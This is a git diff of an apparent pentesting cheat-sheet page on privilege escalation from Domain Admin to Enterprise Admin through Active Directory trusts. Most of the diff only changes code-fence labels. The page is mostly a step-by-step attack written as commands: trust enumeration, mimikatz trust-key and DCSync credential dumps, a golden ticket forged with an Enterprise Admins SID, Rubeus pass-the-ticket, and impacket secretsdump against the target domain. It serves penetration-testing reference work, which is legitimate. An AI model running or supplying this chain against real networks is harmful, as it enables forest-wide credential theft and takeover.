@@ -4,7 +4,6 @@ date: 2024-7-2
 tags: ["kerberos", "da", "ea", "active directory", "ad", "domain controller", "Windows", "golden ticket", "privesc", "mimikatz", "rubeus", "trusts"]
 ---
 
----
 ### Privesc from DA (Domain Admin) to EA (Enterprise Admin)
 
 {{< tab set1 tab1 active >}}Windows{{< /tab >}}
@@ -14,17 +13,17 @@ tags: ["kerberos", "da", "ea", "active directory", "ad", "domain controller", "W
 
 <div>
 
-```powershell
+```console
 # Get all trusted domain objects in a forest
 Get-ADTrust -Filter *
 ```
 
-```powershell
+```console
 # Returns a list of trusted domains
 nltest /domain_trusts
 ```
 
-```powershell
+```console
 # Gets a collection of the trust relationships of the current forest
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 ```
@@ -35,7 +34,7 @@ nltest /domain_trusts
 
 <div>
 
-```powershell
+```console
 ./mimikatz.exe 'lsadump::trust' 'exit'
 ```
 
@@ -45,7 +44,7 @@ nltest /domain_trusts
 
 <div>
 
-```powershell
+```console
 ./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit'
 ```
 
@@ -55,7 +54,7 @@ nltest /domain_trusts
 
 <div>
 
-```powershell
+```console
 # Append '-519' to target domain SID
 ./mimikatz.exe 'kerberos::golden /user:Administrator /rc4:<HASH> /domain:<CURRENT_DOMAIN> /sid:<CURRENT_DOMAIN_SID> /sids:<TARGET_DOMAIN_SID>-519 /ticket:C:\ProgramData\ticket.kirbi' 'exit'
 ```
@@ -68,7 +67,7 @@ nltest /domain_trusts
 
 <div>
 
-```powershell
+```console
 ./rubeus.exe asktgs /service:cifs/<TARGET_DOMAIN> /domain:<DOMAIN> /dc:<DC> /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap /ptt
 ```
 
@@ -86,7 +85,7 @@ nltest /domain_trusts
 
 <div>
 
-```bash
+```console
 python3 rubeustoccache.py <BASE64_TICKET_2> secrets.kirbi secrets.ccache
 ```
 
@@ -96,11 +95,11 @@ python3 rubeustoccache.py <BASE64_TICKET_2> secrets.kirbi secrets.ccache
 
 <div>
 
-```bash
+```console
 export KRB5CCNAME=secrets.ccache
 ```
 
-```bash
+```console
 impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass
 ```
 
@@ -109,9 +108,18 @@ impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass
 <small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>
 
 {{< /tabcontent >}}
-
 {{< tabcontent set2 tab2 >}}
+
+<div>
+
+#### 1. TO-DO
+
+```console
 TO-DO
+```
+
+</div>
+
 {{< /tabcontent >}}
 
 <br>
